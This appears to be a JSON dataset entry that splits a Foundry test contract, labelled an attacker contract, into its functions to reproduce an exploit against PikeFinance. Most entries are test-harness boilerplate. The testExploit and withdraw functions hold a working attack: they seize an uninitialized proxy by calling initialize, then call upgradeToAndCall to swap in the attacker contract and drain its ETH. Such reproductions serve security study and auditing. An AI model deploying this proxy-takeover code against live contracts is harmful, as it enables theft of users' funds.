[
  {
    "contract/interface": "PikeFinance",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "PikeFinance",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PikeFinance",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PikeFinance",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PikeFinance",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "PikeFinance",
    "source_type": "attacker_contract",
    "function_name": "proxiableUUID",
    "original_code": "    function proxiableUUID() external pure returns (bytes32) {\n        return 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PikeFinance",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.deal(address(this), 0);\n        vm.createSelectFork(\"mainnet\", blocknumToForkFrom);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PikeFinance",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PikeFinance",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PikeFinance",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PikeFinance",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "PikeFinance",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PikeFinance",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PikeFinance",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\" Attacker ETH Balance Before exploit\", address(this).balance, 18);\n\n        // Initialize proxy contract\n        address _owner = address(this);\n        address _WNativeAddress = address(this);\n        address _uniswapHelperAddress = address(this);\n        address _tokenAddress = address(this);\n        uint16 _swapFee = 20;\n        uint16 _withdrawFee = 20;\n        IPikeFinanceProxy(PikeFinanceProxy).initialize(\n            _owner, _WNativeAddress, _uniswapHelperAddress, _tokenAddress, _swapFee, _withdrawFee\n        );\n\n        // Upgrade proxy contract\n        address newImplementation = address(this);\n        bytes memory data = abi.encodeWithSignature(\"withdraw(address)\", address(this));\n        IPikeFinanceProxy(PikeFinanceProxy).upgradeToAndCall(newImplementation, data);\n\n        // Log balances after exploit\n        emit log_named_decimal_uint(\" Attacker ETH Balance After exploit\", address(this).balance, 18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PikeFinance",
    "source_type": "attacker_contract",
    "function_name": "withdraw",
    "original_code": "    function withdraw(\n        address addr\n    ) external {\n        (bool success,) = payable(addr).call{value: address(this).balance}(\"\");\n        require(success, \"transfer failed\");\n    }\n\n",
    "description": ""
  }
]